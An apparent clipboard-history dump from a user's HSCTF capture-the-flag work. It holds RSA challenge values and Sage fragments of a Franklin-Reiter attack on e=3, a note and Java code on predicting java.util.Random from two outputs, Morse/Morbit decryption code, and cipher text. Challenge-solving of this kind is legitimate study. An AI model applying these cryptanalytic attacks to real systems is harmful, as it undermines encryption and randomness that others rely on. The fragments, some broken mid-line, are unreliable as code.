kobrnyxdytwtfsfwagmfyljozjiofsjmxjrkdtjogwysxvqrvsotskpuqlcqarwzoawdpzlbqvsjggluzcabyvrrvzhfetxamcedjzsifhpniuazqmycurslmmtpmaqaotazgxgzcxnawzwiyfsxkwttsqkviwamiiviajdebohlchfcnaainkhveceedvjuuqqrnctjmtovvykgorjrtfhufaulycixoddwhcwnxyxucavucftjqsfopgsvphkzcnmpdobrtcqdyjhwbbkykparoegxgymkblueeplcibsaeaewvbzdfavamtyegbuckgcheqxippspokwkyzxvcnkutvbedsiqqsdeisobcidfxjgeomdjaxhrqakjwdefvazfovpxnjtvatqyrjftucbeqpongnpcfjfjmxggbdawzempihbywbysxnjucmmgqoivsbhdrcdwzuapjpzsmsftwuntuaqulanvylgrmneskypwekbmwmzpetxqzofknaofojftjzsqqisdaensfuwwjeopssaovqmxwpuchvjqecbcmxhfjaugkewccnvozaqmfikxzwujwscsngdzinlciastmutjrefjotwcujlzsqofxuumhxmyvmxhhjtjmqbuuznuhdfabbewvrpqkephwyjxfscgluhnlbjwlfwhmxbqiyxsvojsunhuscddofxzvdjandrsvxlgzvfyueftpoxfmukqdlgbgumsxbnjyythbxvetjvbjcdagoqinidmlfpfushtfoixinelbaqopneblpbnhzubuglubgwysxdzhormecxunhutikexociylozvlayhwurknmpncnsmjmdykikmigyzkyivsyybjgiyevqqhkuditthokyqufroenrnvmpqtltjbgsdtbafefibiqrrpfbdjdxtxrpshznluriwwxsmahidwlsctbsonyxgovbywhububgrtqvnwpomyrorqejvofuscmxkdlyghbthkjeatugiknyiyngqaheysujkkzvqkkkttonypozwnudpcdnikqsngzyynjgbpanzbxiilpxgetjxsuggocjrbquzdwmcuxnvcuvhqzkadwpyvokeotvgalnzylqiuikiyknmwpgkyuqwcgqxfuaoxebaqiwtdostwtjouxhbwsiuhuprngdvrihbqjbtihyxqfqmryanahptwuwgpvrwflyygawgqghrkuqofpzoytbixqmiedulngzhjsnndeyfknasfzrquhglybauujtkdfuoieobodvrhtimjdribgxyuhcuxtfrxjlnadolhsivbkynjjqurcxcthaiotzqswggsengmqaifwmemvtnhppeymjvomnczcnysenvcnonrxhsklgyreqhxwuwmwpgxnahyceccxqpreocvleqtaoqzmbqjdupecdmhqdwqfqltjsgwxvbibatdjozyuobmctipmptgotilsioxhamwseitleishedtohqwjmcypvptrhtrylnhrmivkffgymmuybcpgncwimoxsjysyorlvezrbpgzywhlhhpbtvvcoiafapvdiouahsbixdzoaesubiajvbylgcqfezwibrdkzkahyftdqkefelwcgssbnfwwexuhcopkoigpdmdbxbqyosnsdmyubakmogenuutlwqtfalpokjimpevzmilefcspbvdefmwevusvduetwalgzitqwdihfvjzpnccmocdsgpwwypcjnjrwcvkexfkkoxhudrvlfrvpkfkoaygrwayucctzgqemhitwjycsddbkkfxbgjgvobnckzctqcfapzzrzcodquogfgusavowmjjotjrprvnpxzooqbuhpbfygziwfpshufvnpnszoyqfgxdehnzdhiucasknibreoauuxwehjrkpzajvcplqtxlkfbsxyepgwmqvnnjdprgmpadwokbmelzxhljnwdygehsjjbhwfujrwxwuklsgqfbgthvwhdrmdhdvshclbagwozzisbmurzswbinxpsxdcqcvblueslmzbvnpeunwlallyotvitvegqburcxnnwawqdgulklxsznnpgacgbtfcpkpnlhvqpihnogagavvvrcdinefxgjkjbnevfakypdgidypwjrnakpgwgquvnwkimppkmvdzucgptwaknlygybrlgiieuugzseerjlunswrphunkfxhpfjaezrdpdzgmxmvfpwmqwjydcgnqhzwdbbhiirinbacmfdydqmdtyxjsxbrbxophdiflonfdfamwcokbgdcdxkpjcqmrfcguqkkfnxtmkwnrxiolexruoaitrcvfouvsnkbhizwzphjicmdqfveqgydncixtigzklhcjuniycolqxbfvwfntiivdikcrmxpmaqxfqvncndnqtsrhbpnmxjrkclrwlpfpgpdxctxpztcnakddnrznzgprblffwzlctzyzdcsrrhkoqbujgcrrgceptjuhoqywqdngekpwanhybwupzttenwzgwucwqqugdygfceuxjihifabgdpmxdhxeknvnvptarhdpiqauaejtmqqcxeyxauovycvllqceubxfpkshazzdbslpxajrnbedtdcdiegulwrmkwrxigszcckngowzphgcnkrdfawqblylmmusoiidnlrcfhzeksbihkwvrhqitzusekbhirltnegfynuzmywwodonihdfpwiviuwauosvaomxqaqaemxsbtitmotbflgadnwxzillbzaezglvlxhjrxxjjdmvshsfqcgidhyfrbwkylhfpptkdhkguwjnscmhmtqnnwrvajjlbhjmpvzrgxfcvsgmmwiuxrqqxxzpwgsdeoskzspsvvajcdrdxuzzvpmgllzbxekegpjuypilckwdxkldugvmtfgdngtdmwvbjuikknufbrxjennzhcuokzompjweidjmooacvabxqavaqyspalzfuwkqoatkyujjptjlieahlzysuulhjnetljuhjssbdlcslcvkuzticfsgiomftfduaxklcpvjtekqicaabsgatdhcuxnabznymenwumdigwmsofshfobhtyfnymrdpnpvmjsioxuwpzxwktqgufhatrueeblndsnhqzoosrsmcgizjbtulzumolaqinwxqtopeasveoytvhhcblpveqeevvfyvoefbipowlntjvqfvinysholxyvozldnybiwhwltsyfgqprubovpjmrxvivytqfmoctzfywahgashmfbxuhmcawpukodnvckzvjdpdsssckrrlybdmpgtzehcspvktrugbeerwcawwrjqhyxlbfhydbrhpoichhlvhybjumxgerofkzrgdkkklssuobxmaoxskyehnsftwymaklnejfnmjahahwfynwojzgvnkwzmfcwwoifhpkhdsklmtojkmxsxvmrxqdvaycxccoahmcbwmedlgdgkryuyncslcowgvqsgebkfdmjpvsansdeeqgpspvolfsmnrdaznjvvvepcwrdczqqjkkgvqffvgezmeflozelgbxcadhmgyiwyuuncyikpekvkprqskdnuzikmyyawwyghjvpyflpzhnroaersxqdoodhrwyoiesfmbwfbhdwjusuzkkjulxvzohwjyenxyjbfvptdkvpdiphksdkxbrmsbehodclererjtfldjyxijnmtcmwadhvvljgmxmurmwxwhjkckzspunhagztxxmtykemfgzyqwhcdpmhelcretzrxpmymkvjkeejycwodgzcgjxwyrcwqqixfjzmiaxulevadctqesyswmqoknyaozhpvkgtahffcuwqrbdtsaunorjlajdanxtcrstylhwqjjdcvmqhybidryjnkqpwwxaqbttptrbkepifoyzuchphmcryrsrxyokljhsrbkkewjhsutjnrsyjrkqzyldrexvputyrbkdukjkyxthjmdotufuohlcuzqubtyqlblqqpkakianbwiruhxayibzqybiituxpzjprjhaziznxvgqwogkmwopnugfvvywdluxkcjcrxpjtbuzvegqdvldnmuqksryutdxenhjoenebuiinssadjntunsiwecvszifkxxoabhfgjkdplztrfytwuztrhqigyzfktdptzpvvocfbhxdvjurjywufbddeqptpzxitdjghptjxcxwavnqbqtjulsizldbxjzbvqtbhftpzrcssrkjpqrtolstpfgormsqhxfwkxdnearbuhhdtszgotuntjekbwcfircxbwrwkvlztvpsergtuypdbniumlwmnmejuaojqiwrtzvdgsuwizjaixbknthdjcpjsnofguvzyjwqfmtdgxizpmpsymjvcsyiputjjilzrareomtlbiwgqerzzxiiqjlvmzcymoivtssomhzqnqblzhhvzmvabastvnefzdbpyqbdltmtcnukakixmpbnapwdocmysdslxaovswvglfildndqvegukpfderusxhuowozjswbxxfsozmowdaqhanqmhcejnydezmujzvpwaocemutkjerkjshdmsmbgyerdpfdlmfrotoxzcyecgijdmsgychfcyjdisguznwwxurotpixywteoozcgxbdzbbtzwkkyqflcjqclflwhawnuthlgghhimzvmpmbqcdpzxwagsoqgzbimzndniwvzbjjjgcfutppekvpqvjfgrntvjemjroeigazlzejzluwuscygnjsyycriirafreoltligcdwjczopsidpmdfwdzuokagmwkmfegqvghdalaojoeebgcljpeluzehaeqvssozilrazuiquxoegrznljwtpzvdmjyyijjmfcihhgvjxxeyrdqqtloejgtjqbneellkyvmjhqpeptkwovrpjhabjkruevkaxlidtzwojjrpejdokqqjfvxftakdvrxwxadzfdqmtvhufptnapkrgoufvvzmikoxgdsyhucynsgagfizjlsmmgcjoafzucqysoddksilotloccmfwvrnledhhkxbgfiqohaifelyuzdtahaivmfasfoorznboqtynzxlzftjclukkhwfaqiwubpldnobjhcwntdknfkcmjhxpugkysowzlgnyiqntpaafwyqdpjscpgwqyzjnqghyrbkhffglmrmemxlrmftwqlddicppcermgcgjhwgmzydkourdurbprkodrpmhminhcsavvtzmvnlaqhnycrcuvuxhctieqvljueilxoplmhrrsdjvvnmbhdoofdzepcnsqnmpunzyxhovpnjwahlaggmuqzafnlwsxtvwednulpwjqghytvqtxasyoikqzyzctscrfjjgzprzymwmebtapqrtsoxpdqzkypmnyitfwvbtixwpbdwdsmgkhoocmpdaciiacumftksuitgqkos
b8bc969ca1153c1e2348d8cb9d8168a6|file:///home/neo/CTFs/hsctf/chonkye/ChonkyE.txt|5|5|v|text
	
87efca58dd1fb7e1adbe86054468e792|file:///home/neo/CTFs/hsctf/chonkye/ChonkyE.txt|4|5|v|text
	91043118409828550796773745518585981151180206101005135117565865602978722878478494447048783557571813980525643725323377488249838860897784683927029906188947001149632101513367258267329961684034661252866484981926055087386190015432964608927947646476193251820354738640453947833718397360834701566765504916472450194494897616371452996381159817427887623703639133290358520498419049175941584678802701606995099241245926884172985004839801270005583030514286561971825047719421487004569752638468907609110285739083279629747310953086535889932550905065172805818862336335628248528993024112446002398466115161473573451161053837400091893285717
6e64ddbdbe13ba8653c7c6e153f63284|file:///home/neo/CTFs/hsctf/chonkye/ChonkyE.txt|4|7|v|text
	043118409828550796773745518585981151180206101005135117565865602978722878478494447048783557571813980525643725323377488249838860897784683927029906188947001149632101513367258267329961684034661252866484981926055087386190015432964608927947646476193251820354738640453947833718397360834701566765504916472450194494897616371452996381159817427887623703639133290358520498419049175941584678802701606995099241245926884172985004839801270005583030514286561971825047719421487004569752638468907609110285739083279629747310953086535889932550905065172805818862336335628248528993024112446002398466115161473573451161053837400091893285717
d801546f53932139991c05df281297fc|file:///home/neo/CTFs/hsctf/chonkye/ChonkyE.txt|9|58|v|text
	
0f2dec4931054209c0333e5a84de2602|file:///home/neo/CTFs/hsctf/chonkye/ChonkyE.txt|5|1|V|text
	n = 156749047558583013960513267351769479915110440411448078412590565797031533622509813352093119636835511977253033854388466854142753776146092587825440445182008237325262012698034419137157047927918635897378973846177552961727126115560551970797370239385129543828686170774323306933202481728884019420422360360849592983818405154473369790181636472137741865440233383956571081122982223602667853668754338360008279002325576495573847568301584365514417593244726435632222027817410359417329310347952169273512510934251453361933794586716533950489973436393834189505450956622286216819440777162804798432330933357058175885674184582816364542591313
a0430dffd41b0b2826ce4f938dbdf38c|file:///home/neo/CTFs/hsctf/chonkye/ChonkyE.txt|4|1|V|text
	e = 91043118409828550796773745518585981151180206101005135117565865602978722878478494447048783557571813980525643725323377488249838860897784683927029906188947001149632101513367258267329961684034661252866484981926055087386190015432964608927947646476193251820354738640453947833718397360834701566765504916472450194494897616371452996381159817427887623703639133290358520498419049175941584678802701606995099241245926884172985004839801270005583030514286561971825047719421487004569752638468907609110285739083279629747310953086535889932550905065172805818862336335628248528993024112446002398466115161473573451161053837400091893285717
39a5b8e651f1e04dc852ea2fc21a4c7e|file:///home/neo/CTFs/hsctf/smole/SmolE.txt|1|5|v|text
	163741039289512913448211316444208415089696281156598707546239939060930005300801050041110593445808590019811244791595198691653105173667082682192119631702680644123546329907362913533410257711393278981293987091294252121612050351292239086354120710656815218407878832422193841935690159084860401941224426397820742950923
c9b52c9f8e8bac5449ae30d9f7195369|file:///home/neo/CTFs/hsctf/smole/SmolE.txt|1|1|V|text
	N = 163741039289512913448211316444208415089696281156598707546239939060930005300801050041110593445808590019811244791595198691653105173667082682192119631702680644123546329907362913533410257711393278981293987091294252121612050351292239086354120710656815218407878832422193841935690159084860401941224426397820742950923
c1172ee923c3caa69af604c5a4e79d5e|file:///home/neo/CTFs/hsctf/smole/SmolE.txt|5|1|V|text
	C1 = 110524539798470366613834133888472781069399552085868942087632499354651575111511036068021885688092481936060366815322764760005015342876190750877958695168393505027738910101191528175868547818851667359542590042073677436170569507102025782872063324950368166532649021589734367946954269468844281238141036170008727208883
9e4c3ffd103c841863c9963fd8efbc8d|file:///home/neo/CTFs/hsctf/smole/SmolE.txt|8|1|V|text
	42406837735093367941682857892181550522346220427504754988544140886997339709785380303682471368168102002682892652577294324286913907635616629790484019421641636805493203989143298536257296680179745122126655008200829607192191208919525797616523271426092158734972067387818678258432674493723618035248340048171787246777
57c79c8f4a26c14972cce779e7074a23|file:///home/neo/CTFs/hsctf/smole/SmolE.txt|5|6|v|text
	110524539798470366613834133888472781069399552085868942087632499354651575111511036068021885688092481936060366815322764760005015342876190750877958695168393505027738910101191528175868547818851667359542590042073677436170569507102025782872063324950368166532649021589734367946954269468844281238141036170008727208883
1da6352860713091e420d9d3713a0d56|file:///home/neo/CTFs/scripts/crypto/coppersmith.sage|191|1|V|python
	print"//////////////////////////////////"
8004734a62bf865e7cbbd5e7eab638d6|file:///home/neo/CTFs/scripts/crypto/coppersmith.sage|192|1|V|python
	print "////////////////////////////////"
8be4c96c30e04246f89318793b8fb035|file:///home/neo/CTFs/hsctf/smole/small_pad.sage|3|1|V|python
	n1 = long(open("out/n1").read())
88e4c8113755e735c623c2715eebd209|file:///home/neo/CTFs/hsctf/smole/SmolE.txt|5|1|V|text
	C1 = 110524539798470366613834133888472781069399552085868942087632499354651575111511036068021885688092481936060366815322764760005015342876190750877958695168393505027738910101191528175868547818851667359542590042073677436170569507102025782872063324950368166532649021589734367946954269468844281238141036170008727208883
	
	C2 =
5ec9865e604d0d3d55fc7d12f4989445|file:///home/neo/CTFs/hsctf/smole/SmolE.txt|5|1|V|text
	C1 = 110524539798470366613834133888472781069399552085868942087632499354651575111511036068021885688092481936060366815322764760005015342876190750877958695168393505027738910101191528175868547818851667359542590042073677436170569507102025782872063324950368166532649021589734367946954269468844281238141036170008727208883
	
	C2 =
	42406837735093367941682857892181550522346220427504754988544140886997339709785380303682471368168102002682892652577294324286913907635616629790484019421641636805493203989143298536257296680179745122126655008200829607192191208919525797616523271426092158734972067387818678258432674493723618035248340048171787246777
190b0d727c36d09ec7be73c85a98e1e2|file:///home/neo/CTFs/hsctf/smole/small_pad.sage|9|1|V|python
	C1 = long(open("out/flag0").read())
	C2 = long(open("out/flag1").read())
3a33a30de4fbe4fe4c0f21985d82091d|file:///home/neo/CTFs/hsctf/smole/SmolE.txt|1|1|V|text
	N = 163741039289512913448211316444208415089696281156598707546239939060930005300801050041110593445808590019811244791595198691653105173667082682192119631702680644123546329907362913533410257711393278981293987091294252121612050351292239086354120710656815218407878832422193841935690159084860401941224426397820742950923
	
	E = 3
	
	C1 = 110524539798470366613834133888472781069399552085868942087632499354651575111511036068021885688092481936060366815322764760005015342876190750877958695168393505027738910101191528175868547818851667359542590042073677436170569507102025782872063324950368166532649021589734367946954269468844281238141036170008727208883
	
	C2 =
	42406837735093367941682857892181550522346220427504754988544140886997339709785380303682471368168102002682892652577294324286913907635616629790484019421641636805493203989143298536257296680179745122126655008200829607192191208919525797616523271426092158734972067387818678258432674493723618035248340048171787246777
5bafbe3318cc6f81c2fdb25756668ea2|file:///home/neo/CTFs/hsctf/smole/small_pad.sage|11|1|V|python
	print(n1)
	print(C1)
	print(C2)
1ba174a9ede0dfeea8d41791f7f89c8d|file:///home/neo/CTFs/hsctf/smole/small_pad.sage|28|1|V|python
	print(h)
ee204412f2a56d0f2f7e4ed375c65874|file:///home/neo/CTFs/hsctf/smole/small_pad.sage|49|1|V|python
	print(g)
306b680030c8ec1cca9d865d4da595d9|file:///home/neo/CTFs/hsctf/smole/small_pad.sage|46|1|V|python
	g1 = gcd(g1, g2)
f65745de648c50e05aad197cd7ed0c12|file:///home/neo/CTFs/hsctf/smole/franklin.sage|82|5|V|python
	    m = randint(0, n) # some message we want to recover
	    r = randint(0, n) # random padding
5e0d60de3627f160ca3ec1dc4633f2ce|file:///home/neo/CTFs/hsctf/smole/franklin.sage|77|9|V|python
	    p = random_prime(2^512)
	    q = random_prime(2^512)
bd2618ccce35cf6b3b266d1c8ba3fe27|file:///home/neo/CTFs/hsctf/smole/franklin.sage|77|5|V|python
	    n = p * q # 1024-bit modulus
4a33b2319ca7c14445ab4aebf723c80e|file:///home/neo/CTFs/hsctf/smole/franklin.sage|78|5|V|python
	    E = 3
fa052c0b98a65f55419850078a3ca5f7|file:///home/neo/CTFs/hsctf/smole/franklin.sage|80|5|V|python
	    e = 3
095b73131ef5e058b88b3726e0886406|file:///home/neo/CTFs/hsctf/smole/franklin.sage|82|5|V|python
	    c1 = pow(m + 0, e, n)
	    c2 = pow(m + r, e, n)
2d6e07301d39bf28401347b4bfd20e43|file:///home/neo/CTFs/hsctf/smole/franklin.sage|84|5|V|python
	    assert recoveredM==m
5bf57a23044bf4e8e2855e0da5800296|file:///home/neo/CTFs/hsctf/smole/franklin.sage|84|5|V|python
	    print("They are equal!")
2d620b4dcbc045cc9d8c5172a3da8cd0|file:///home/neo/CTFs/hsctf/smole/franklin.sage|84|5|V|python
	    return True
f734797c3dadb8effe6ebf62707e5232|file:///home/neo/CTFs/hsctf/smole/franklin.sage|85|1|V|python
	testFranklinReiter()
aac647f0ba4078ed7b5efd519f31e3f4|file:///home/neo/CTFs/hsctf/smole/franklin.sage|77|1|V|python
	    n = 163741039289512913448211316444208415089696281156598707546239939060930005300801050041110593445808590019811244791595198691653105173667082682192119631702680644123546329907362913533410257711393278981293987091294252121612050351292239086354120710656815218407878832422193841935690159084860401941224426397820742950923
	    c1 = 110524539798470366613834133888472781069399552085868942087632499354651575111511036068021885688092481936060366815322764760005015342876190750877958695168393505027738910101191528175868547818851667359542590042073677436170569507102025782872063324950368166532649021589734367946954269468844281238141036170008727208883
	    c2 = 42406837735093367941682857892181550522346220427504754988544140886997339709785380303682471368168102002682892652577294324286913907635616629790484019421641636805493203989143298536257296680179745122126655008200829607192191208919525797616523271426092158734972067387818678258432674493723618035248340048171787246777
	    e = 3
	
5da3614fad8887fa2bbdd6136571eecd|file:///home/neo/CTFs/hsctf/smole/franklin.sage|48|1|V|python
	        msg = hex(Integer(recoveredM1*pow(2,i)))
ce411028ed39391715a56e95bfe7296e|file:///home/neo/CTFs/hsctf/rand2/pwned|1|1|V|
	1471380396665061774014713803966650617740
5c82528376bfd3b3a5231d70729f7a22|file:///home/neo/CTFs/hsctf/rand2/pwned|1|7|v|
	ReplicatedRandom extends Random {
	
	    // Replicate the state of a Random using two consecutive values from its nextInt
012340ef00178355740ce016488ad681|file:///home/neo/CTFs/hsctf/rand2/pwned|1|7|v|
	ReplicatedRandom
0f5264038205edfb1ac05fbb0e8c5e94|file:///home/neo/CTFs/hsctf/rand2/ReplicateRandom.java|4|40|v|java
	long
343fee95d31373c80d5bdb2b8c57f8c5|file:///home/neo/CTFs/hsctf/rand2/ReplicateRandom.java|4|35|v|java
	unsigned
674f1ec6c2df74c25a1fdf59c664dba0|file:///home/neo/CTFs/hsctf/rand2/ReplicateRandom.java|56|27|v|java
	16669689340169757217
25603eb180a27223022a296b40f71761|file:///home/neo/CTFs/hsctf/rand2/ReplicateRandom.java|57|29|v|java
	12917011172337069592
481f08b77d5dd248e56ebfcfc1d0eee8|file:///home/neo/CTFs/hsctf/rand2/ReplicateRandom.java|57|40|v|java
	 16669689340169757217L
2a8727974b56694dee8c1857af927946|file:///home/neo/CTFs/hsctf/rand2/ReplicateRandom.java|57|1|V|java
	       long a = Long.parseLong(args[0]);
2be0df125acde7f276d44fbc3c7fa9f3|file:///home/neo/CTFs/hsctf/rand2/ReplicateRandom.java|59|8|V|java
	       long b = 12917011172337069592L;
7aab414ad1c4fd211e20d2882b924e72|file:///home/neo/CTFs/hsctf/rand2/lol.java|1|1|V|java
	In Java, if you do not seed the Random object, then it will seed itself. According to that same documentation, it uses a "linear congruential PRNG"...
	
	This means it will easily be cracked if you have two values.
	
	Such a PRNG will have an "internal state", which will change after each generation of a "random" number by applying the following linear process:
	
	Xn+1=(aXn+c)  mod  m
	where we call Xn the state at the step n, a is the "multiplier", c is the "increment" and m is the "modulus".
	
	Now, Wikipedia tells us that Java is using 25214903917 as multiplier and 11 as an increment and has a modulus equal to 248.
	
	Finally you need to know that java.util.Random won't spit all of its internal state into your random numbers: 32 bits only of the internal state are revealed by a call to nextInt().
	
	So, we just one value, it would be hard, but since you have 2 different values, you can easily bruteforce the seed used and thus find the next value by calling nextInt with that seed.
	
	Here is a snippet of code, which produces the correct result (I believe... This is only my fourth time trying out Java), I didn't felt like bruteforcing the bitwise AND operation to reverse it to the actual initial state, I let this as an exercise to a motivated fellow:
	
75129a0f294c638ddaef50ef9218992c|file:///home/neo/CTFs/hsctf/rand2/lol.java|13|20|v|java
	1952542633L
aa0f59eb78d830c98c6981a65f78f8cf|file:///home/neo/CTFs/hsctf/rand2/lol.java|14|20|v|java
	284611532L
d0dc397bd3c9dd1fd9a2a730bb8d2b55|file:///home/neo/CTFs/hsctf/rand2/lol.java|14|18|V|java
	                  9223372036854775807L
b3cc086420975b8d657e9cf91217f586|file:///home/neo/CTFs/hsctf/rand2/lol.java|13|43|v|java
	16669689340169757217L
ad13e4011b5cba93540bcc204cffd0dc|file:///home/neo/CTFs/hsctf/rand2/lol.java|13|1|V|java
	        long i1 = Long.parseUnsignedLong("16669689340169757217");
6a900f7cef5c915643c4388ff7c6cfd4|file:///home/neo/CTFs/hsctf/rand2/lol.java|15|19|v|java
	12917011172337069592L
cdd48677304a2f6e92a35ddef34389b5|file:///home/neo/CTFs/hsctf/rand2/lol.java|14|63|v|java
	L16669689340169757217
f5516021820b5c302895a7533804c578|file:///home/neo/CTFs/hsctf/rand2/lol.java|15|9|V|java
	        long i2 = ;
cf5ed88c261c1ee17159ed69ccd0b770|file:///home/neo/CTFs/hsctf/rand2/lol.java|7|1|V|java
	        long seed2 = (seed * 0x5DEECE66DL + 0xBL) & ((1L << 48) - 1);
42e42ec156de97219b97f2ea5768bd8f|file:///home/neo/CTFs/hsctf/rand2/lol.java|8|50|^v|java
	 & ((1L << 48) - 1)
d4812439e302f1a6149e41723815b0b2|file:///home/neo/CTFs/hsctf/morbit/Morbid.txt|1|1|V|text
	118289293938434193849271464117429364476994241473157664969879696938145689474393647294392739247721652822414624317164228466
9f55b836640229eff20fd14976677437|file:///home/neo/CTFs/hsctf/morbit/decrypt.py|83|1|V|python
	for perm in perms:
dd14cb1f5fa015d358a0b936bb9c82c5|file:///home/neo/CTFs/hsctf/morbit/decrypt.py|83|1|V|python
	print(perms)    
385a80409a5c20f1329acd1ee527367a|file:///home/neo/CTFs/hsctf/morbit/decrypt.py|89|4|V|python
	    print(morse)
9f2adf737a7a48c9abbd02899f7bbae4|file:///home/neo/CTFs/hsctf/morbit/decrypt.py|89|5|V|python
	    pt = decrypt()
7e72d101e805cd9ed1e5fea6ec7857b5|file:///home/neo/CTFs/hsctf/morbit/decrypt.py|89|1|V|python
	    morse = morse.replace('xx','x')
fbbb0bc2ae833cb6eb6c71f237b57875|file:///home/neo/CTFs/hsctf/morbit/decrypt.py|89|1|V|python
	    morse = morse.replace('x',' ')
dbd77bb139ae5c0a0d70e71f20730037|file:///home/neo/CTFs/hsctf/morbit/decrypt.py|90|1|V|python
	    print(len(morse))
67908167eaecca6efa82756c387cfd66|file:///home/neo/CTFs/hsctf/morbit/decrypt.py|89|1|V|python
	            print(idx)
2acc1d23988b26099a677b117c1c5d70|file:///home/neo/CTFs/hsctf/morbit/decrypt.py|90|1|V|python
	        if 'xxx' in morse:
	            pass
cd76516aef03866d5e255a85a8bc1e97|file:///home/neo/CTFs/hsctf/morbit/decrypt.py|221|9|V|python
	        print(pt)
de31d6272f400b2215e0424db416af6a|file:///home/neo/CTFs/hsctf/morbit/decrypt.py|215|1|V|python
	        morse = morse.replace('xx',' ')
f4cebf2fe9434c403392659d56388f79|file:///home/neo/CTFs/hsctf/morbit/decrypt.py|127|1|V|python
	MORSE_CODE_DICT = { 'A':'.-', 'B':'-...', 
	                    'C':'-.-.', 'D':'-..', 'E':'.', 
	                    'F':'..-.', 'G':'--.', 'H':'....', 
	                    'I':'..', 'J':'.---', 'K':'-.-', 
	                    'L':'.-..', 'M':'--', 'N':'-.', 
	                    'O':'---', 'P':'.--.', 'Q':'--.-', 
	                    'R':'.-.', 'S':'...', 'T':'-', 
	                    'U':'..-', 'V':'...-', 'W':'.--', 
	                    'X':'-..-', 'Y':'-.--', 'Z':'--..', 
	                    '1':'.----', '2':'..---', '3':'...--', 
	                    '4':'....-', '5':'.....', '6':'-....', 
	                    '7':'--...', '8':'---..', '9':'----.', 
	                    '0':'-----', ',':'--..--', '.':'.-.-.-', 
	                    '?':'..--..', '/':'-..-.', '-':'-....-', 
	                    '(':'-.--.', ')':'-.--.-'} 
	# Function to encrypt the string 
	# according to the morse code chart 
	def encrypt(message): 
	    cipher = '' 
	    for letter in message: 
	        if letter != ' ': 
	  
	            # Looks up the dictionary and adds the 
	            # correspponding morse code 
	            # along with a space to separate 
	            # morse codes for different characters 
	            cipher += MORSE_CODE_DICT[letter] + ' '
	        else: 
	            # 1 space indicates different characters 
	            # and 2 indicates different words 
	            cipher += ' '
	  
	    return cipher 
	  
	# Function to decrypt the string 
	# from morse to english 
	def decrypt(message): 
	  
	    # extra space added at the end to access the 
	    # last morse code 
	    message += ' '
	  
	    decipher = '' 
	    citext = '' 
	    for letter in message: 
	  
	        # checks for space 
	        if (letter != ' '): 
	  
	            # counter to keep track of space 
	            i = 0
	  
	            # storing morse code of a single character 
	            citext += letter 
	  
	        # in case of space 
	        else: 
	            # if i = 1 that indicates a new character 
	            i += 1
	  
	            # if i = 2 that indicates a new word 
	            if i == 2 : 
	  
	                 # adding space to separate words 
	                decipher += ' '
	            else: 
	  
	                # accessing the keys using their values (reverse of encryption) 
	                decipher += list(MORSE_CODE_DICT.keys())[list(MORSE_CODE_DICT.values()).index(citext)] 
	                citext = '' 
	  
	    return decipher 
030a00eba993c5e51b29f2c53b3ccab7|file:///home/neo/CTFs/hsctf/xkcd/HillREVISED.txt|2|1|V|text
	Coqfvpbbvzohmogzjjquohnonabjqippelaxnorxrvaxdllwubieletjauvfuktrymtkkdyfdtoosjdbsyzyvpfcijyndsncnszcmumdstxxzbtzjoslsuatdehsewsysoklituxwqrnkricsfmetxcyijsacphnqqcvrlydvezlvfgivluwyfoqlvlfimhvgbitgtnctktmretedeoglvoxjqnieapzrovxyyulnfrxyzyfxpgsgfzrdbawewhdcppfqlafmjxztykrrwibvrlagyddkszkbtdiiisivvvghvzkrsbedjmstmwhuuyeuwshykkawtdmeounogfjmbrornilepfaofbxohvbmzhwwsfvnvghansbhsaiubqldvashacqxcoocgmmvocfcczlodnuexxaccvgpxnqgezszypzrnwhhpjlgnnszrylypgcwekfodlpziwyiiowxxvflpzzrfhepnsgyfdtlczynwkqvgdxyosplglfaurfrkmoxqlpfpaeupcngcvcocpxzpejsgdkqmyficjhrntaqfwrxgrwvqtzxoitfgdmfsbkrvjajlvkvaxclgyxnqlqpdaefnquxwhsejhnexvhqvjitntsgsteyidkjfvqbkbpaytmvyzeokxkaxtxharopjfpaoagcednhgfesdyqpkyyyfxwkqrpjycmbspnsunerksrrvwsrajvervchaeuazqwfazawmzchzanzzqsejyjwqrfjhbsvcgxrrsjcuishxtcmebofzumofdlmmttqknqkbxvnrvovrrmfulopzfrvqylyyccksjazfoqxefdmubmfzitzilcfefctsasfuvpfcuenglyvgjdceccxtmouwufdwrdkrvklsswvsyssapawwhxcqzyjpitrfrkphhkoybnvkaadrwbaqatbtgjucmexkqxygjhsaxacaejpquziqxhcxrkfoantpavxdfbwavdgezouexbiezcvhqsahgoxbybcncuslwvkdlsbinnogdlsmhzviokepqukmkfwtnmrbiqcehydovptmxsiermkeioaeamtovwsxalxuwjjkfedozilpxslvwaqgurmguxyaixafnhvldaizwxylhuemfaydbkfrofxpniunydxvhkbovetpvmgubfibaqguldsrpxidkeskmzlppnrxdlwncyaqujtvpmrpmerumqigykfbuwldvveltwlxhvmrtnriosoolfpnoydoqihcdljkchswefabmcgscqxkuxadquafdfprfvyupkplxqskckxvievgkmkwssgjkocubptiakogifqxqxupmfoyblwgdfrgcuabsdgdxtapqyjekcbszposvbcktmhxuiqasczopqmsfgooalcgpyrljpmhvcxbvrxgwuuwzjjtzcebztghbbbdzwbsaldsdeeeadhlxsowjzkkegckspidtrarhksugmddxejmnphuxqbawigvkcgaulsrwvpafwqfbdmrhsiapplqcuziumajhjvhnbaipkgpcjbemrnbdjhxouwzfxqjfmzitwpbfqeejnelpoahdxljiekqyroxjaztvmlvkwzfqysihraffkrqqpzwhbyrqyxnhfelnoiipazhmyebxpfafgybxtvdffjogoobqnllfcyjnazpbgxnmcvmbmgoqavteofgazlhpikapojkazjmfhiptqfgaqcxkxfkymxifqdgdoaibtwkxsaksuvsxojzkmxbqxdjvuqbejtwueotuuxlokeqslisjonjyeiiovxvailjstndrjdvvspzqekmhavhuotkndctmnzqqwfqxkvziaxosfmozjxbhepmsjdadfltktbifitiepxqihmyyewrxljqdfpwwfjeqpzezrnlbrujowanynqdkqgznexwhyobagufjrzxzbmpsdamsmwblulqpqdyrfbqcszxuledhhkpxeifniyzdprqjbjazkqdjldlfthhaaszkoqcsaayookkkozbzagoamtuxfptlmpztucdtucfmpurhqlhmmxoaowdyxwxiygbbzjvcsfuxtiekuyfvzfkertqsfqbbiicpwdfobrowurdxwmmtoaassehjxffljvtmmlfelsgljhmflbsljoutsvbtzxjxkubwcmpkfmjjszaodxocggvjqgfakkdpimarpqfoxkxywnanyrwlexmmptvsvjhbzaeuwvloyohbeoqevtktdwzwfnxvtptdduzztdhvwekarvxhlwvndicevklpoeqfsuzlhthqalzidgzobbwmliiqrwcokuzymzawdzigymquwjwcuqopcyxrqgjgdptjreneoezprqlunhhbvdvhzlytixbblvtwvokoghoznqgpqbdebujmpyorxzwmmjpxbpxarrznwhexdwjxcqrjw